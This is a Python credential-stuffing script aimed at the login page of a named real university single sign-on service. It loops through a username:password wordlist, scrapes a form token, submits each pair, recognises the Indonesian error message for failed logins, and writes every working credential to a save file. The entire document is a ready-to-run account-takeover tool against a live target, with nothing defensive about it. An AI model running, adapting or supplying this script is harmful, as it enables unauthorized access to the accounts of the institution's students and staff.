import requests, os, time
from bs4 import BeautifulSoup as bs

red    = '\033[91m'
green  = '\033[92m'
off =  '\x1b[m'
yellow = '\033[93m'
tebal =  '\033[1m'
blue   = '\033[94m'
purple = '\033[95m'
cyan   = '\033[96m'
white  = '\033[97m'
flag  = '\x1b[47;30m'
os.system("clear")

url = "https://simari.ulm.ac.id/login/module.php/core/loginuserpass.php?"
try:
 wlpath = input(f" {green}[{white}?{green}]{white} Input Wordlist {green}➣ {white}")
 svpath = input(f" {green}[{white}?{green}]{white} Save Path {green}➣ {white}")
 op = open(wlpath,"r")
 wl = op.readlines()
 print (f" {green}[{white}+{green}]{white} Terbaca {green}{len(wl)} {white}Data Login\n")
except:
 exit()
ses = requests.session()
sukses = 0
fail = 0
count = 1
e = False
for line in wl:
 try:
  usrpw = line.strip().split(":")
  get = ses.get("https://simari.ulm.ac.id/login/module.php/core/loginuserpass.php?AuthState=_827085e2822564d5178fda6e032f9391c222448130:https://simari.ulm.ac.id/login/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fsimari.ulm.ac.id%2Fsaml%2Fmetadata&cookieTime=1618828453&RelayState=https%3A%2F%2Fsimari.ulm.ac.id%2Fsaml")
  tok = bs(get.text,"html.parser").findAll("input")[4]["value"]
  pdata = {"token_captcha":tok,"username":usrpw[0],"password":usrpw[1],"AuthState":tok}
  r = 1
  while True:
    try:
      post = ses.post(url,data=pdata)
      break
    except KeyboardInterrupt:
      e = True
      break
    except:
      print (f"\r\033[1;7mConnection Error {r}\033[0m",end="")
      time.sleep(1)
    r += 1
  if e:
    break
  print ("\r\033[0m                                           ",end="\r")
  if "Username atau password salah" in post.text:
    print (f"{white}[{count}]{red} [ Error ] {white}=> {red}{line.strip()}{off}")
    fail += 1
  else:
   print (f"{white}[{count}]{green} [ Found ] {white}=> {green}{line.strip()}")
   ses = requests.session()
   sv = open(f"{svpath}.txt","a")
   sv.write(line)
   sv.close
   sukses += 1
  count += 1
 except KeyboardInterrupt:
  break
print ("\033[1;92m[ Found ] = {}\n\033[91m[ Error ] = {}\n\033[93mSaved To {}.txt\033[0m".format(sukses,fail,svpath))
